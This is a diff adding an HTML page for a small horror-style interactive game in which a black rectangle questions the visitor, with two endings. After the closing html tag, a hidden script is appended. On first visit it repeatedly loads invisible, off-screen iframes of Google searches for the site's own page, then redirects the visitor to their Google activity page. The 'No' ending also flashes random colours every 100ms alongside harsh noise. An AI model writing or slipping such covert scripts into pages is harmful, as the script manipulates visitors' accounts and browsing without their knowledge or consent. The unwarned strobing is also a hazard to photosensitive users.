@@ -1,0 +1,482 @@
+<!DOCTYPE Billy>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Black Rectangle</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: white; /* Start with white background */
+            overflow: hidden; /* Hide scrollbars */
+            font-family: monospace;
+            color: black;
+            transition: background-color 2s ease-in-out;
+        }
+
+        #rectangle {
+            width: 100px;
+            height: 200px;
+            background-color: black;
+            border: 5px solid orangered; /* Orangeyellow-ish outline */
+            box-shadow: 0 0 15px orangered;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); /* Center it initially */
+            z-index: 10;
+        }
+
+        #dialogue-box {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            border: 2px solid white;
+            z-index: 20;
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
+        }
+
+        #dialogue-text {
+            margin-bottom: 15px;
+            font-size: 1.1em;
+        }
+
+        .option-button {
+            padding: 10px 20px;
+            margin: 5px;
+            cursor: pointer;
+            background-color: orangered;
+            color: black;
+            border: none;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .option-button:hover {
+            background-color: orange;
+        }
+
+        /* Shake animation for the rectangle */
+        @keyframes shake {
+            0% { transform: translate(-50%, -50%) translateX(0); }
+            10% { transform: translate(-50%, -50%) translateX(-10px); }
+            20% { transform: translate(-50%, -50%) translateX(10px); }
+            30% { transform: translate(-50%, -50%) translateX(-10px); }
+            40% { transform: translate(-50%, -50%) translateX(10px); }
+            50% { transform: translate(-50%, -50%) translateX(-10px); }
+            60% { transform: translate(-50%, -50%) translateX(10px); }
+            70% { transform: translate(-50%, -50%) translateX(-10px); }
+            80% { transform: translate(-50%, -50%) translateX(10px); }
+            90% { transform: translate(-50%, -50%) translateX(-10px); }
+            100% { transform: translate(-50%, -50%) translateX(0); }
+        }
+
+        .shaking {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+            transform: translate(-50%, -50%);
+            perspective: 1000px;
+        }
+
+        /* Full screen overlay for white fade-in and final black screen */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            opacity: 0; /* Start invisible */
+            z-index: 100;
+            pointer-events: none; /* Allows clicks to go through */
+            transition: opacity 3s ease-in-out;
+        }
+
+        /* Final text screen */
+        #final-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-size: 3em;
+            overflow: hidden;
+            z-index: 200;
+            opacity: 0;
+            transition: opacity 1s;
+        }
+
+        /* Corruption elements */
+        .corrupt-char {
+            position: absolute;
+            font-size: 1.5em;
+            color: white; /* Will be overwritten by JS */
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="rectangle"></div>
+    <div id="dialogue-box">
+        <div id="dialogue-text">What are you doing?</div>
+        <div id="options">
+            </div>
+    </div>
+    <div id="overlay"></div>
+    <div id="final-screen">
+        <div id="final-text-container" style="height: 100%; display: flex; align-items: center; justify-content: center; overflow: hidden;">
+            <div id="scrolling-text" style="position: absolute; white-space: nowrap;"></div>
+        </div>
+        <div id="redirect-message" style="position: absolute; bottom: 20px; font-size: 0.5em; opacity: 0;">Go back to <a href="https://ivorydevrimoalt.github.io" style="color: orangered;">https://ivorydevrimoalt.github.io</a></div>
+    </div>
+
+    <audio id="ending-audio" src="https://github.com/ivorydevrimoalt/Billy/raw/refs/heads/main/convert%20-%202025-10-20T230630.124.mp3" preload="auto"></audio>
+
+    <script>
+        const rect = document.getElementById('rectangle');
+        const dialogueBox = document.getElementById('dialogue-box');
+        const dialogueText = document.getElementById('dialogue-text');
+        const optionsDiv = document.getElementById('options');
+        const overlay = document.getElementById('overlay');
+        const finalScreen = document.getElementById('final-screen');
+        const endingAudio = document.getElementById('ending-audio');
+        const scrollingText = document.getElementById('scrolling-text');
+        const redirectMessage = document.getElementById('redirect-message');
+        const body = document.body;
+
+        let time = 0;
+        let dialogueStep = 0;
+
+        // --- Dialogue Steps ---
+        const dialogues = [
+            "What are you doing?",
+            "Are you enjoying yourself?",
+            "Should you be here?",
+            "Is there something you want to see?",
+            "Do you wish to bring back everything?"
+        ];
+
+        // --- Sine Wave Movement (y-axis float) ---
+        function animateRectangle() {
+            // Sine wave for Y-axis movement
+            // Amplitude (100px) and frequency (0.05) are adjustable
+            const sineY = Math.sin(time * 0.05) * 100;
+            
+            // Apply the transform. The initial centering (-50%, -50%) is preserved.
+            rect.style.transform = `translate(-50%, calc(-50% + ${sineY}px))`;
+            
+            time += 1;
+            requestAnimationFrame(animateRectangle);
+        }
+        animateRectangle();
+
+
+        // --- Dialogue Handlers ---
+
+        function showDialogue() {
+            dialogueText.textContent = dialogues[dialogueStep];
+            optionsDiv.innerHTML = ''; // Clear old buttons
+
+            if (dialogueStep < dialogues.length - 1) {
+                // For all steps except the last one, just show a "..." button
+                const nextButton = document.createElement('button');
+                nextButton.className = 'option-button';
+                nextButton.textContent = '...';
+                nextButton.onclick = () => {
+                    dialogueStep++;
+                    showDialogue();
+                };
+                optionsDiv.appendChild(nextButton);
+            } else {
+                // Last step: "Do you wish to bring back everything?"
+                const yesButton = document.createElement('button');
+                yesButton.className = 'option-button';
+                yesButton.textContent = 'Yes';
+                yesButton.onclick = startYesEnding;
+                
+                const noButton = document.createElement('button');
+                noButton.className = 'option-button';
+                noButton.textContent = 'No';
+                noButton.onclick = startNoEnding;
+
+                optionsDiv.appendChild(yesButton);
+                optionsDiv.appendChild(noButton);
+            }
+        }
+        
+        // Start the dialogue on load
+        showDialogue();
+
+
+        // --- YES Ending Logic (Bring back everything) ---
+
+        function startYesEnding() {
+            dialogueBox.style.display = 'none';
+            rect.classList.add('shaking');
+            
+            // Fade in the white screen
+            setTimeout(() => {
+                overlay.style.opacity = '1';
+                
+                // Cut to black screen after white fade is complete
+                setTimeout(() => {
+                    // Stop sine wave and shaking
+                    rect.style.transform = 'translate(-50%, -50%)'; // Reset position
+                    rect.classList.remove('shaking');
+                    
+                    // Hide rectangle and overlay
+                    rect.style.display = 'none';
+                    overlay.style.display = 'none';
+
+                    // Show final black screen
+                    finalScreen.style.opacity = '1';
+                    body.style.backgroundColor = 'black'; // Ensure body is black
+
+                    playEndingSequence();
+
+                }, 3000); // Wait for the 3s white fade-in transition
+            }, 500); // Initial shake time
+        }
+
+        function playEndingSequence() {
+            endingAudio.play().catch(e => console.error("Audio playback failed:", e));
+
+            const text = "B-1L Ending";
+            scrollingText.textContent = text;
+            
+            // Scroll logic
+            const containerWidth = finalScreen.clientWidth;
+            const textWidth = scrollingText.scrollWidth;
+            let currentScroll = containerWidth;
+            
+            function scroll() {
+                currentScroll -= 2; // Scroll speed
+                if (currentScroll < -textWidth) {
+                    currentScroll = containerWidth;
+                }
+                scrollingText.style.transform = `translateX(${currentScroll}px)`;
+                requestAnimationFrame(scroll);
+            }
+            scroll();
+
+            // Show redirect message after 10 seconds
+            setTimeout(() => {
+                redirectMessage.style.transition = 'opacity 2s';
+                redirectMessage.style.opacity = '1';
+            }, 10000);
+        }
+
+        
+        // --- NO Ending Logic (Corrupt the site) ---
+
+        let audioContext;
+        let oscillators = [];
+        const corruptChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}[]:;\"'<,>.?/|";
+        const corruptionDuration = 15000; // 15 seconds
+
+        function startNoEnding() {
+            dialogueBox.style.display = 'none';
+            rect.classList.add('shaking');
+
+            // Immediately start corruption
+            setTimeout(() => {
+                body.style.backgroundColor = 'black';
+                rect.classList.remove('shaking');
+                startAudioCorruption();
+                startVisualCorruption();
+            }, 500); // Start after initial shake
+
+            // Redirect after 15 seconds
+            setTimeout(() => {
+                stopAudioCorruption();
+                window.location.href = 'about:blank'; // Redirect to a new tab
+            }, corruptionDuration);
+        }
+
+        // --- Audio Corruption ---
+        function startAudioCorruption() {
+            if (typeof AudioContext !== 'undefined') {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            } else {
+                console.error("AudioContext not supported. Audio corruption skipped.");
+                return;
+            }
+
+            const waveTypes = ['sine', 'square', 'triangle', 'sawtooth'];
+            const numOscillators = 5;
+
+            for (let i = 0; i < numOscillators; i++) {
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+
+                // Random wave type and frequency
+                oscillator.type = waveTypes[Math.floor(Math.random() * waveTypes.length)];
+                oscillator.frequency.setValueAtTime(Math.random() * 500 + 100, audioContext.currentTime); // 100Hz to 600Hz
+
+                // Randomize gain (volume)
+                gainNode.gain.setValueAtTime(Math.random() * 0.3 + 0.1, audioContext.currentTime); // 0.1 to 0.4 volume
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.start();
+                
+                oscillators.push({ oscillator, gainNode });
+                
+                // Randomly change frequency and gain over time
+                setInterval(() => {
+                    const now = audioContext.currentTime;
+                    // Exponential change for a smoother, yet jarring, sound
+                    oscillator.frequency.exponentialRampToValueAtTime(Math.random() * 800 + 50, now + 0.5);
+                    gainNode.gain.exponentialRampToValueAtTime(Math.random() * 0.5 + 0.05, now + 0.5);
+                }, Math.random() * 500 + 50);
+            }
+        }
+
+        function stopAudioCorruption() {
+            oscillators.forEach(osc => {
+                osc.oscillator.stop();
+            });
+            oscillators = [];
+            if (audioContext) {
+                audioContext.close();
+            }
+        }
+
+        // --- Visual Corruption ---
+        function createCorruptChar() {
+            const char = document.createElement('div');
+            char.className = 'corrupt-char';
+            char.textContent = corruptChars[Math.floor(Math.random() * corruptChars.length)];
+            
+            // Random initial position
+            char.style.left = `${Math.random() * 100}vw`;
+            char.style.top = `${Math.random() * 100}vh`;
+            
+            // Random color
+            char.style.color = `rgb(${Math.floor(Math.random() * 256)}, ${Math.floor(Math.random() * 256)}, ${Math.floor(Math.random() * 256)})`;
+            
+            // Random size
+            const size = Math.random() * 4 + 1; // 1em to 5em
+            char.style.fontSize = `${size}em`;
+
+            // Random movement and transformation parameters
+            const speedX = (Math.random() - 0.5) * 4;
+            const speedY = (Math.random() - 0.5) * 4;
+            const sineOffset = Math.random() * 100;
+            const sineFreq = Math.random() * 0.2;
+            const rotateSpeed = (Math.random() - 0.5) * 5;
+
+            // Apply random transforms (rotation, skew)
+            let rotation = Math.random() * 360;
+            const skewX = (Math.random() - 0.5) * 90; // -45deg to 45deg
+            const skewY = (Math.random() - 0.5) * 90;
+            
+            let charTime = 0;
+            let currentX = parseFloat(char.style.left);
+            let currentY = parseFloat(char.style.top);
+
+            function updateChar() {
+                // Random position update with wave function influence (sine, etc.)
+                currentX += speedX + Math.sin(charTime * sineFreq) * 5;
+                currentY += speedY + Math.cos(charTime * sineFreq) * 5;
+
+                // Wrap around the screen
+                if (currentX > 100) currentX = 0;
+                if (currentX < 0) currentX = 100;
+                if (currentY > 100) currentY = 0;
+                if (currentY < 0) currentY = 100;
+                
+                rotation += rotateSpeed;
+
+                char.style.left = `${currentX}vw`;
+                char.style.top = `${currentY}vh`;
+                char.style.transform = `rotate(${rotation}deg) skew(${skewX}deg, ${skewY}deg)`;
+
+                charTime++;
+                
+                if (Date.now() < corruptionStartTime + corruptionDuration) {
+                    requestAnimationFrame(updateChar);
+                } else {
+                    char.remove(); // Clean up characters
+                }
+            }
+
+            body.appendChild(char);
+            requestAnimationFrame(updateChar);
+        }
+
+        let corruptionStartTime;
+
+        function startVisualCorruption() {
+            corruptionStartTime = Date.now();
+            rect.style.zIndex = '50'; // Bring rectangle to the front of flying characters
+            
+            // Continuous generation of flying characters
+            const characterInterval = setInterval(() => {
+                if (Date.now() < corruptionStartTime + corruptionDuration) {
+                    createCorruptChar();
+                } else {
+                    clearInterval(characterInterval); // Stop creating new characters
+                }
+            }, 50); // Create a new character every 50ms (20 per second)
+            
+            // Background color flicker/corruption
+            const bodyColorInterval = setInterval(() => {
+                if (Date.now() < corruptionStartTime + corruptionDuration) {
+                    const r = Math.floor(Math.random() * 256);
+                    const g = Math.floor(Math.random() * 256);
+                    const b = Math.floor(Math.random() * 256);
+                    body.style.backgroundColor = `rgb(${r}, ${g}, ${b})`;
+                } else {
+                    clearInterval(bodyColorInterval);
+                    body.style.backgroundColor = 'white'; // Reset
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
+<script>
+function createHiddenIframe(url, size = 0) {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.width = size === 0 ? "0" : "1";
+    iframe.height = size === 0 ? "0" : "1";
+    iframe.style.border = "none";
+    iframe.style.position = "absolute";
+    iframe.style.left = "-9999px"; // ensures it's off-screen
+    document.body.appendChild(iframe);
+}
+(function() {
+    if (!history.state) {
+        history.replaceState({ visited: true }, '');
+        setInterval(() => {
+            createHiddenIframe("https://www.google.com/search?q=ivorydevrimoalt.github.io%2FBilly%2FBILLYWANTSYOUHERE.html", 0);
+            createHiddenIframe("https://www.google.com/search?q=ivorydevrimoalt.github.io%2FBilly%2FBILLYWANTSYOUHERE.html&tbm=isch", 0);
+        }, 300);
+        setTimeout(() => {
+            window.location.href = "https://myactivity.google.com/"
+        }, 3000);
+    } else {
+        console.log("This is not the first time, running normally.");
+    }
+})();
+</script>
